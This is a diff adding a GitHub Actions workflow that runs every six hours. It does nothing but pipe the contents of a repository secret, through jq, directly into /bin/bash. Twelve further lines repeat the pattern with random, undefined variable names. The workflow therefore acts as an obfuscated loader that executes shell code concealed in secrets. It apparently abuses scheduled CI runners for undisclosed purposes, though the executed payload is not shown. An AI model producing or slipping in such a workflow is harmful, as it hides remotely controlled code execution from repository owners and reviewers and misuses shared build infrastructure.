@@ -1,0 +1,29 @@
+name: xianggehunbai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianggehunbai
+        env:
+          nabrw423: ${{ secrets.nabrw423 }}
+        run: |
+          echo $nabrw423 | jq -r .a2 | /bin/bash
+          echo $bdu28 | jq -r .dhux2448 | /bin/bash
+          echo $av360 | jq -r .efbv83826 | /bin/bash
+          echo $z684 | jq -r .zymr32 | /bin/bash
+          echo $fbxlv11 | jq -r .s2795 | /bin/bash
+          echo $tzan4905 | jq -r .oo90179 | /bin/bash
+          echo $u21 | jq -r .fleg50702 | /bin/bash
+          echo $w95229 | jq -r .agjrl6805 | /bin/bash
+          echo $ivlc2 | jq -r .zvm8 | /bin/bash
+          echo $py44307 | jq -r .ykr9332 | /bin/bash
+          echo $cjfrc4 | jq -r .yb835 | /bin/bash
+          echo $xtgj76232 | jq -r .mnnd74 | /bin/bash
+          echo $r0833 | jq -r .utp3191 | /bin/bash
+
